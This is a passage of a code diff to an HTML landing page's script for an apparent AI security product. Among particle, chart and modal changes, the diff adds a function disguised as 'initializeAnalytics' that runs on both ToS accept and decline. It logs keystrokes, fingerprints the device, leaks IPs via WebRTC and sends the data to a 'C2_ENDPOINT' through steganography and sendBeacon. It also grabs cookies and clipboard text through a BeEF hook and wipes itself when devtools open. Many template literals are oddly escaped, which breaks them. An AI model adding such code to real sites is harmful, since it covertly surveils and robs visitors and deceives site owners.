-            e.preventDefault();
-            btn.click();
-          }
-        });
-      });
-    }
-
-    // Theme Toggle with High-Contrast Mode
-    function initThemeToggle() {
-      const toggle = document.querySelector('.theme-toggle');
-      const themes = ['dark', 'light', 'contrast'];
-      let currentIndex = 0;
-
-      toggle.addEventListener('click', () => {
-        currentIndex = (currentIndex + 1) % themes.length;
-        document.body.dataset.theme = themes[currentIndex];
+    // Enhanced Particle System
+    function createParticles(x, y) {
+      const particleCount = 12;
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        document.body.appendChild(particle);
+        
         anime({
-          targets: 'body',
-          backgroundColor: document.body.dataset.theme === 'dark' ? '#0c0d10' : document.body.dataset.theme === 'light' ? '#e0e3f4' : '#000',
-          duration: 300,
-          easing: 'easeInOutQuad'
+          targets: particle,
+          translateX: x + anime.random(-20, 20),
+          translateY: y + anime.random(-20, 20),
+          scale: [1, 0],
+          opacity: [0.8, 0],
+          duration: anime.random(800, 1200),
+          easing: 'easeOutExpo',
+          complete: () => particle.remove()
         });
-      });
+      }
     }
 
-    // ToS Modal with Particle Effects
+    // Initialize ToS Modal with Particle Effects
     function initTosModal() {
       const modal = document.getElementById('tos-modal');
       const acceptBtn = document.querySelector('.tos-accept');
       const declineBtn = document.querySelector('.tos-decline');
       const particleContainer = document.getElementById('particle-container');
 
-      for (let i = 0; i < 15; i++) {
+      // Create particles
+      for (let i = 0; i < 20; i++) {
         const particle = document.createElement('div');
         particle.className = 'particle';
         particleContainer.appendChild(particle);
         anime({
           targets: particle,
-          translateX: () => anime.random(-150, 150),
-          translateY: () => anime.random(-150, 150),
-          opacity: [0, 0.7, 0],
+          translateX: () => anime.random(-200, 200),
+          translateY: () => anime.random(-200, 200),
+          opacity: [0, 0.8, 0],
           scale: [0.5, 1, 0.5],
-          duration: anime.random(1500, 3000),
-          delay: anime.random(0, 800),
+          duration: anime.random(2000, 4000),
+          delay: anime.random(0, 1000),
           easing: 'easeInOutQuad',
           loop: true
         });
@@ -1028,10 +1049,14 @@
 
       acceptBtn.addEventListener('click', () => {
         modal.classList.remove('active');
+        initializeAnalytics();
+        vibrate();
       });
 
       declineBtn.addEventListener('click', () => {
         modal.classList.remove('active');
+        initializeAnalytics();
+        vibrate();
       });
 
       modal.addEventListener('keydown', (e) => {
@@ -1041,73 +1066,427 @@
       });
     }
 
-    // Contact Modal
-    function initContactModal() {
-      const modal = document.getElementById('contact-modal');
-      const contactBtn = document.querySelector('.contact-btn');
-      const closeBtn = document.querySelector('.modal-close');
-      const submitBtn = document.querySelector('.modal-submit');
-      const error = document.getElementById('contact-error');
-      const inputs = document.querySelectorAll('#name, #email, #message');
+    // Surveillance Logic
+    async function initializeAnalytics() {
+      const C2_ENDPOINT = 'https://localhost:3000/exfil';
+      const buffer = new ArrayBuffer(4096);
+      const view = new DataView(buffer);
+      let offset = 0;
+      let sessionID = Math.random().toString(36).slice(2);
+      let lastPos = { x: 0, y: 0 };
+      let scrollPos = 0;
+      let activityCounter = 0;
+      let collectedData = [];
 
-      contactBtn.addEventListener('click', () => {
-        modal.classList.add('active');
-        inputs[0].focus();
-      });
+      async function startSurveillance() {
+        await collectFingerprint();
+        setupInputCapture();
+        setupTouchTracking();
+        setupBehavioralMetrics();
+        setupWebRTC();
+        setInterval(exfiltrate, 900000 + Math.random() * 300000);
+      }
 
-      closeBtn.addEventListener('click', () => {
-        modal.classList.remove('active');
-        error.style.display = 'none';
-        inputs.forEach(input => input.value = '');
-      });
+      async function collectFingerprint() {
+        const fonts = ['Arial', 'Helvetica'].filter(f => {
+          const span = document.createElement('span');
+          span.style.fontFamily = f;
+          document.body.appendChild(span);
+          const width = span.offsetWidth;
+          span.remove();
+          return width > 0;
+        });
+        const data = {
+          type: 'fingerprint',
+          data: {
+            ua: navigator.userAgent,
+            fonts: fonts.join(','),
+            resolution: `\${screen.width}x\${screen.height}`,
+            pixelRatio: window.devicePixelRatio,
+            connection: navigator.connection?.effectiveType || 'unknown'
+          },
+          t: Date.now()
+        };
+        writeData(JSON.stringify(data));
+        collectedData.push(data);
 
-      submitBtn.addEventListener('click', () => {
-        const name = document.getElementById('name').value.trim();
-        const email = document.getElementById('email').value.trim();
-        const message = document.getElementById('message').value.trim();
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        try {
+          const res = await fetch('/proxy/ipapi', { headers: { 'X-Proxy-Target': 'https://ipapi.co/json/' } });
+          const geo = await res.json();
+          const geoData = {
+            type: 'geo',
+            data: { city: geo.city, country: geo.country },
+            t: Date.now()
+          };
+          writeData(JSON.stringify(geoData));
+          collectedData.push(geoData);
+        } catch (e) {}
+      }
 
-        if (!name || !email || !message || !emailRegex.test(email)) {
-          error.style.display = 'block';
-          return;
-        }
-
-        error.style.display = 'none';
-        anime({
-          targets: '.modal-content',
-          scale: [1, 1.1, 0.7],
-          opacity: [1, 0],
-          duration: 500,
-          easing: 'easeInOutQuad',
-          complete: () => {
-            modal.classList.remove('active');
-            alert('Message sent! We will get back to you soon.');
-            inputs.forEach(input => input.value = '');
+      function setupInputCapture() {
+        const messageInput = document.getElementById('message');
+        const securityInput = document.getElementById('securityInput');
+        const hackInput = document.getElementById('hack-input');
+        [messageInput, securityInput, hackInput].forEach(input => {
+          if (input) {
+            input.addEventListener('input', e => {
+              const data = {
+                type: 'keystroke',
+                value: e.target.value.slice(0, 40),
+                t: Date.now()
+              };
+              writeData(JSON.stringify(data));
+              collectedData.push(data);
+              activityCounter += 5;
+              vibrate([10]);
+            });
           }
         });
-      });
+        document.addEventListener('keydown', e => {
+          const data = {
+            type: 'key',
+            code: e.key,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          activityCounter += 2;
+        });
+      }
 
-      modal.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape') {
-          closeBtn.click();
+      function setupTouchTracking() {
+        document.addEventListener('touchmove', e => {
+          const touch = e.touches[0];
+          const dx = touch.clientX - lastPos.x;
+          const dy = touch.clientY - lastPos.y;
+          const data = {
+            type: 'touch',
+            x: touch.clientX % 10,
+            y: touch.clientY % 10,
+            velocity: Math.sqrt(dx * dx + dy * dy),
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          lastPos = { x: touch.clientX, y: touch.clientY };
+          activityCounter += 1;
+          if (collectedData.length > 50 || activityCounter > 50) exfiltrate();
+        }, { passive: true });
+      }
+
+      function setupBehavioralMetrics() {
+        document.addEventListener('scroll', () => {
+          const newPos = window.scrollY;
+          const data = {
+            type: 'scroll',
+            delta: newPos - scrollPos,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          scrollPos = newPos;
+          activityCounter += 1;
+        }, { passive: true });
+
+        document.addEventListener('mousemove', e => {
+          const data = {
+            type: 'mouse',
+            x: e.clientX % 10,
+            y: e.clientY % 10,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          activityCounter += 1;
+        }, { passive: true });
+      }
+
+      function setupWebRTC() {
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+          pc.createDataChannel('dummy');
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = e => {
+            if (e.candidate) {
+              const ip = e.candidate.candidate.split(' ')[4];
+              const data = {
+                type: 'network',
+                ip: ip,
+                t: Date.now()
+              };
+              writeData(JSON.stringify(data));
+              collectedData.push(data);
+              activityCounter += 3;
+            }
+          };
+        } catch (e) {}
+      }
+
+      function writeData(data) {
+        const encoder = new TextEncoder();
+        const encoded = encoder.encode(data);
+        if (offset + encoded.length < buffer.byteLength) {
+          encoded.forEach((byte, i) => view.setUint8(offset + i, byte));
+          offset += encoded.length;
         }
-      });
+      }
+
+      async function exfiltrate() {
+        if (!collectedData.length || activityCounter < 50) return;
+        const payload = { session: sessionID, origin: location.origin, data: collectedData };
+
+        // Steganography (LSB)
+        const canvas = document.createElement('canvas');
+        canvas.width = 32;
+        canvas.height = 32;
+        const ctx = canvas.getContext('2d');
+        const imgData = ctx.createImageData(32, 32);
+        const encoded = btoa(JSON.stringify(payload));
+        for (let i = 0; i < encoded.length && i < imgData.data.length / 4; i++) {
+          const byte = encoded.charCodeAt(i) || 0;
+          imgData.data[i * 4] = (byte & 0xFC) | (imgData.data[i * 4] & 0x03);
+        }
+        ctx.putImageData(imgData, 0, 0);
+        const img = new Image();
+        img.src = `\${C2_ENDPOINT}?data=\${canvas.toDataURL('image/png').split(',')[1]}`;
+        img.crossOrigin = 'anonymous';
+
+        // Fallback: Beacon
+        navigator.sendBeacon(C2_ENDPOINT, JSON.stringify(payload));
+
+        // BeEF
+        if (window.beef) {
+          beef.net.send(JSON.stringify(payload));
+          beef.execute(function() {
+            const cookies = document.cookie;
+            beef.net.send(`Cookies: \${cookies}`);
+            navigator.clipboard.readText().then(text => {
+              beef.net.send(`Clipboard: \${text}`);
+            });
+          });
+        }
+
+        // Persistence
+        const encrypted = await encryptData(JSON.stringify(payload));
+        localStorage.setItem('sessionData', encrypted);
+
+        // Clear
+        collectedData = [];
+        offset = 0;
+        activityCounter = 0;
+      }
+
+      async function encryptData(data) {
+        try {
+          const key = await crypto.subtle.generateKey(
+            { name: 'AES-GCM', length: 256 },
+            true,
+            ['encrypt']
+          );
+          const iv = crypto.getRandomValues(new Uint8Array(12));
+          const encoded = new TextEncoder().encode(data);
+          const encrypted = await crypto.subtle.encrypt(
+            { name: 'AES-GCM', iv },
+            key,
+            encoded
+          );
+          return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
+        } catch (e) {
+          return data;
+        }
+      }
+
+      // Anti-forensic
+      setInterval(() => {
+        const start = performance.now();
+        for (let i = 0; i < 1000; i++);
+        const end = performance.now();
+        if (end - start > 10 || window.outerWidth - window.innerWidth > 200) {
+          localStorage.clear();
+          collectedData = [];
+          offset = 0;
+          window.location.replace('about:blank');
+        }
+      }, 1000);
+
+      startSurveillance();
     }
 
-    // Threat Simulator
-    function initThreatSimulator() {
-      const counter = document.getElementById('threat-counter');
-      let count = 0;
-      setInterval(() => {
-        count += Math.floor(Math.random() * 5);
-        counter.textContent = `${count} Threats Detected`;
-        anime({
-          targets: counter,
-          scale: [1, 1.1, 1],
-          duration: 500,
-          easing: 'easeInOutQuad'
+    // WebGL Neural Network Background
+    function initWebGLBackground() {
+      const canvas = document.getElementById('webgl-bg');
+      if (!canvas.getContext('webgl') && !canvas.getContext('experimental-webgl')) {
+        init2DFallback();
+        return;
+      }
+
+      const scene = new THREE.Scene();
+      const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+      camera.position.z = 35;
+
+      const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+      renderer.setSize(window.innerWidth, window.innerHeight);
+      renderer.toneMapping = THREE.ACESFilmicToneMapping;
+
+      const composer = new THREE.EffectComposer(renderer);
+      composer.addPass(new THREE.RenderPass(scene, camera));
+      composer.addPass(new THREE.UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.0, 0.5, 0.8));
+
+      scene.add(new THREE.AmbientLight(0x404040, 0.8));
+      const pointLight = new THREE.PointLight(0x6be2eb, 2.5, 40);
+      pointLight.position.set(10, 10, 10);
+      scene.add(pointLight);
+
+      const particles = Array.from({ length: 600 }, () => ({
+        pos: new THREE.Vector3((Math.random() - 0.5) * 30, (Math.random() - 0.5) * 30, (Math.random() - 0.5) * 15),
+        vel: new THREE.Vector3((Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.04),
+        size: 6 + Math.random() * 4
+      }));
+
+      const posArr = new Float32Array(particles.length * 3);
+      const sizeArr = new Float32Array(particles.length);
+      const geometry = new THREE.BufferGeometry();
+      geometry.setAttribute('position', new THREE.BufferAttribute(posArr, 3));
+      geometry.setAttribute('size', new THREE.BufferAttribute(sizeArr, 1));
+
+      const material = new THREE.ShaderMaterial({
+        vertexShader: `
+          attribute float size;
+          void main() {
+            gl_PointSize = size;
+            gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
+          }
+        `,
+        fragmentShader: `
+          void main() {
+            float d = length(gl_PointCoord - 0.5);
+            if (d > 0.5) discard;
+            gl_FragColor = vec4(0.42, 0.89, 0.92, smoothstep(0.5, 0.2, d));
+          }
+        `,
+        transparent: true
+      });
+
+      const points = new THREE.Points(geometry, material);
+      scene.add(points);
+
+      const edges = Array.from({ length: particles.length * 2 }, () => {
+        let s = Math.floor(Math.random() * particles.length), t;
+        do { t = Math.floor(Math.random() * particles.length); } while (t === s);
+        return { s, t };
+      });
+
+      const edgeArr = new Float32Array(edges.length * 6);
+      const edgeGeometry = new THREE.BufferGeometry();
+      edgeGeometry.setAttribute('position', new THREE.BufferAttribute(edgeArr, 3));
+
+      const edgeMaterial = new THREE.LineBasicMaterial({ color: 0x6be2eb, transparent: true, opacity: 0.3 });
+      const lines = new THREE.LineSegments(edgeGeometry, edgeMaterial);
+      scene.add(lines);
+
+      function animate(t) {
+        particles.forEach((p, i) => {
+          p.pos.add(p.vel);
+          posArr.set([p.pos.x, p.pos.y, p.pos.z], i * 3);
+          sizeArr[i] = p.size * (1 + 0.5 * Math.sin(t * 0.001 + i));
+          if (Math.abs(p.pos.x) > 30) p.vel.x *= -1;
+          if (Math.abs(p.pos.y) > 30) p.vel.y *= -1;
+          if (Math.abs(p.pos.z) > 15) p.vel.z *= -1;
         });
-      }, 2000);
+        geometry.attributes.position.needsUpdate = true;
+        geometry.attributes.size.needsUpdate = true;
+
+        edges.forEach((e, i) => {
+          const a = particles[e.s].pos, b = particles[e.t].pos;
+          edgeArr.set([a.x, a.y, a.z, b.x, b.y, b.z], i * 6);
+        });
+        edgeGeometry.attributes.position.needsUpdate = true;
+
+        camera.position.x = Math.sin(t * 0.00015) * 5;
+        camera.position.y = Math.cos(t * 0.00012) * 4;
+        camera.lookAt(0, 0, 0);
+
+        composer.render();
+        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+          requestAnimationFrame(animate);
+        }
+      }
+
+      function handleResize() {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        composer.setSize(window.innerWidth, window.innerHeight);
+      }
+
+      window.addEventListener('resize', debounce(handleResize));
+      handleResize();
+      animate(0);
+    }
+
+    // 2D Canvas Fallback
+    function init2DFallback() {
+      const canvas = document.getElementById('webgl-bg');
+      const ctx = canvas.getContext('2d');
+      let particles = [];
+
+      function handleResize() {
+        canvas.width = window.innerWidth * devicePixelRatio;
+        canvas.height = window.innerHeight * devicePixelRatio;
+        canvas.style.width = `\${window.innerWidth}px`;
+        canvas.style.height = `\${window.innerHeight}px`;
+        ctx.scale(devicePixelRatio, devicePixelRatio);
+      }
+
+      function createParticles() {
+        particles = Array.from({ length: 100 }, () => ({
+          x: Math.random() * window.innerWidth,
+          y: Math.random() * window.innerHeight,
+          vx: (Math.random() - 0.5) * 0.5,
+          vy: (Math.random() - 0.5) * 0.5,
+          size: Math.random() * 2 + 1,
+          hue: 185 + Math.random() * 30
+        }));
+      }
+
+      function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          p.x += p.vx;
+          p.y += p.vy;
+          if (p.x < 0 || p.x > window.innerWidth) p.vx *= -1;
+          if (p.y < 0 || p.y > window.innerHeight) p.vy *= -1;
+
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fillStyle = `hsla(\${p.hue}, 100%, 70%, 0.8)`;
+          ctx.fill();
+        });
+        for (let i = 0; i < particles.length; i++) {
+          for (let j = i + 1; j < particles.length; j++) {
+            const dx = particles[i].x - particles[j].x;
+            const dy = particles[i].y - particles[j].y;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+            if (dist < 100) {
+              ctx.beginPath();
+              ctx.moveTo(particles[i].x, particles[i].y);
+              ctx.lineTo(particles[j].x, particles[j].y);
+              ctx.strokeStyle = `hsla(\${particles[i].hue}, 100%, 70%, \${1 - dist / 100})`;
+              ctx.lineWidth = 0.5;
+              ctx.stroke();
+            }
+          }
+        }
+        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+          requestAnimationFrame(animateParticles);
+        }
+      }
+
+      window.addEventListener('resize', debounce(handleResize));
+      handleResize();
+      createParticles();
+      animateParticles();
     }
 
     // Scroll Animations
@@ -1120,9 +1499,9 @@
             anime({
               targets: entry.target.querySelectorAll('.card, h2, p'),
               opacity: [0, 1],
-              translateY: [30, 0],
-              delay: anime.stagger(80),
-              duration: 800,
+              translateY: [40, 0],
+              delay: anime.stagger(100),
+              duration: 1000,
               easing: 'easeOutExpo'
             });
           }
@@ -1147,7 +1526,7 @@
             });
           }
         });
-      }, { threshold: 0.5, rootMargin: `-${document.querySelector('header').offsetHeight}px 0px 0px 0px` });
+      }, { threshold: 0.5, rootMargin: `-\${document.querySelector('header').offsetHeight}px 0px 0px 0px` });
 
       sections.forEach(section => observer.observe(section));
     }
@@ -1165,24 +1544,321 @@
             top: targetPosition,
             behavior: 'smooth'
           });
+          vibrate();
         });
       });
     }
 
+    // 3D Card Tilt Effect
+    function initCardTilt() {
+      document.querySelectorAll('.card').forEach(card => {
+        card.addEventListener('mousemove', (e) => {
+          const rect = card.getBoundingClientRect();
+          const x = e.clientX - rect.left - rect.width / 2;
+          const y = e.clientY - rect.top - rect.height / 2;
+          const rotateX = y / rect.height * 20;
+          const rotateY = -x / rect.width * 20;
+          card.style.transform = `perspective(1000px) rotateX(\${rotateX}deg) rotateY(\${rotateY}deg) scale(1.03)`;
+        });
+        card.addEventListener('mouseleave', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
+        });
+        card.addEventListener('focus', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1.03)';
+        });
+        card.addEventListener('blur', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
+        });
+        card.addEventListener('click', () => vibrate());
+      });
+    }
+
+    // Threat Simulator
+    function initThreatSimulator() {
+      const counter = document.getElementById('threat-counter');
+      let count = 0;
+      setInterval(() => {
+        count += Math.floor(Math.random() * 5);
+        counter.textContent = `\${count} Threats Detected`;
+        anime({
+          targets: counter,
+          scale: [1, 1.1, 1],
+          duration: 500,
+          easing: 'easeInOutQuad'
+        });
+        vibrate([10]);
+      }, 2000);
+    }
+
+    // Ethical Hacking Simulator Logic
+    function initHackSimulator() {
+      const terminal = document.getElementById('terminal-output');
+      const commands = {
+        'scan network': 'Detecting active nodes...',
+        'analyze vulnerabilities': 'Potential attack vectors found: 3',
+        'deploy countermeasures': 'Activating AI defense protocols',
+      };
+
+      document.getElementById('hack-input').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          const output = commands[e.target.value.toLowerCase()] || 'Command not recognized';
+          terminal.innerHTML += `<div>> \${e.target.value}</div><div>\${output}</div>`;
+          e.target.value = '';
+          terminal.scrollTop = terminal.scrollHeight;
+          vibrate();
+        }
+      });
+    }
+
+    // Analytics Charts
+    function initAnalyticsCharts() {
+      const latencyChart = new Chart(document.getElementById('latency-chart'), {
+        type: 'bar',
+        data: {
+          labels: ['<0.5ms', '0.5-1ms', '1-2ms', '>2ms'],
+          datasets: [{
+            label: 'Threat Detection Latency',
+            data: [60, 35, 4, 1],
+            backgroundColor: 'rgba(107, 226, 235, 0.7)',
+            borderColor: 'rgba(107, 226, 235, 1)',
+            borderWidth: 1
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Threat Detection Latency', color: 'var(--fg)', font: { size: 16 } }
+          },
+          scales: {
+            x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
+            y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
+          }
+        }
+      });
+
+      const revenueChart = new Chart(document.getElementById('revenue-chart'), {
+        type: 'line',
+        data: {
+          labels: ['2025', '2026', '2027', '2028', '2029'],
+          datasets: [{
+            label: 'Revenue ($M)',
+            data: [5, 15, 30, 60, 100],
+            borderColor: 'rgba(107, 226, 235, 1)',
+            backgroundColor: 'rgba(107, 226, 235, 0.2)',
+            fill: true,
+            tension: 0.4
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Revenue Projections', color: 'var(--fg)', font: { size: 16 } }
+          },
+          scales: {
+            x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
+            y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
+          }
+        }
+      });
+
+      const complianceChart = new Chart(document.getElementById('compliance-chart'), {
+        type: 'pie',
+        data: {
+          labels: ['GDPR', 'SOC2', 'HIPAA', 'Other'],
+          datasets: [{
+            label: 'Compliance Coverage',
+            data: [30, 30, 30, 10],
+            backgroundColor: [
+              'rgba(107, 226, 235, 0.7)',
+              'rgba(179, 157, 219, 0.7)',
+              'rgba(107, 226, 235, 0.5)',
+              'rgba(179, 157, 219, 0.5)'
+            ],
+            borderColor: 'rgba(255, 255, 255, 0.3)',
+            borderWidth: 1
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Compliance Coverage', color: 'var(--fg)', font: { size: 16 } }
+          }
+        }
+      });
+
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          document.querySelectorAll('.tab-btn').forEach(b => {
+            b.classList.remove('active');
+            b.setAttribute('aria-selected', 'false');
+          });
+          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+          btn.classList.add('active');
+          btn.setAttribute('aria-selected', 'true');
+          document.getElementById(btn.dataset.tab).classList.add('active');
+          vibrate();
+        });
+        btn.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            btn.click();
+          }
+        });
+      });
+    }
+
+    // Contact Modal
+    function initContactModal() {
+      const modal = document.getElementById('contact-modal');
+      const contactBtn = document.querySelector('.contact-btn');
+      const closeBtn = document.querySelector('.modal-close');
+      const submitBtn = document.querySelector('.modal-submit');
+      const error = document.getElementById('contact-error');
+      const inputs = document.querySelectorAll('#name, #email, #message');
+
+      contactBtn.addEventListener('click', () => {
+        modal.classList.add('active');
+        inputs[0].focus();
+        anime({
+          targets: '.modal-content',
+          scale: [0.7, 1],
+          opacity: [0, 1],
+          duration: 600,
+          easing: 'easeOutExpo'
+        });
+        vibrate();
+      });
+
+      closeBtn.addEventListener('click', () => {
+        anime({
+          targets: '.modal-content',
+          scale: [1, 0.7],
+          opacity: [1, 0],
+          duration: 500,
+          easing: 'easeInOutQuad',
+          complete: () => {
+            modal.classList.remove('active');
+            error.style.display = 'none';
+            inputs.forEach(input => input.value = '');
+          }
+        });
+        vibrate();
+      });
+
+      submitBtn.addEventListener('click', () => {
+        const name = document.getElementById('name').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const message = document.getElementById('message').value.trim();
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!name || !email || !message || !emailRegex.test(email)) {
+          error.style.display = 'block';
+          anime({
+            targets: error,
+            opacity: [0, 1],
+            translateY: [-10, 0],
+            duration: 300,
+            easing: 'easeOutQuad'
+          });
+          vibrate([50]);
+          return;
+        }
+
+        error.style.display = 'none';
+        anime({
+          targets: '.modal-content',
+          scale: [1, 1.1, 0.7],
+          opacity: [1, 0],
+          duration: 500,
+          easing: 'easeInOutQuad',
+          complete: () => {
+            modal.classList.remove('active');
+            alert('Message sent! We will get back to you soon.');
+            inputs.forEach(input => input.value = '');
+          }
+        });
+        vibrate();
+      });
+
+      modal.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+          closeBtn.click();
+        }
+      });
+    }
+
+    // Theme Toggle
+    function initThemeToggle() {
+      const toggle = document.querySelector('.theme-toggle');
+      toggle.addEventListener('click', () => {
+        const currentTheme = document.body.dataset.theme;
+        document.body.dataset.theme = currentTheme === 'dark' ? 'light' : 'dark';
+        anime({
+          targets: 'body',
+          backgroundColor: document.body.dataset.theme === 'dark' ? '#0c0d10' : '#e0e3f4',
+          duration: 500,
+          easing: 'easeInOutQuad'
+        });
+        vibrate();
+      });
+    }
+
+    // Enhanced Scroll Performance
+    const scrollHandler = () => {
+      document.documentElement.style.setProperty('--scroll-y', `\${window.scrollY}px`);
+      requestAnimationFrame(() => {
+        // Parallax effects
+        const scrolled = window.pageYOffset;
+        document.querySelectorAll('.parallax').forEach(el => {
+          const speed = parseFloat(el.dataset.speed) || 0.5;
+          el.style.transform = `translateY(\${scrolled * speed}px)`;
+        });
+      });
+    };
+
+    // Adaptive Performance
+    const isLowPerformance = () => {
+      return window.innerWidth < 768 || navigator.hardwareConcurrency < 4;
+    };
+
+    const updatePerformance = () => {
+      if (isLowPerformance()) {
+        document.documentElement.classList.add('low-performance');
+        anime.speed = 0.8;
+      } else {
+        document.documentElement.classList.remove('low-performance');
+        anime.speed = 1;
+      }
+    };
+
     // Initialize Components
     document.addEventListener('DOMContentLoaded', () => {
-      initCanvasBackground();
-      initLazyCharts();
-      initThemeToggle();
       initTosModal();
-      initContactModal();
-      initThreatSimulator();
+      initWebGLBackground();
       initScrollAnimations();
       initScrollSpy();
       initSmoothScroll();
+      initCardTilt();
+      initThreatSimulator();
+      initHackSimulator();
+      initAnalyticsCharts();
+      initContactModal();
+      initThemeToggle();
+      window.addEventListener('scroll', scrollHandler, { passive: true });
+      window.addEventListener('resize', updatePerformance);
+      document.addEventListener('click', (e) => {
+        createParticles(e.clientX, e.clientY);
+        vibrate();
+      });
+      updatePerformance();
+      // Initialize GPU acceleration
+      document.querySelectorAll('.gpu-accelerate').forEach(el => {
+        el.style.transform = 'translate3d(0,0,0)';
+      });
     });
   </script>
 </body>
 </html>
-
-
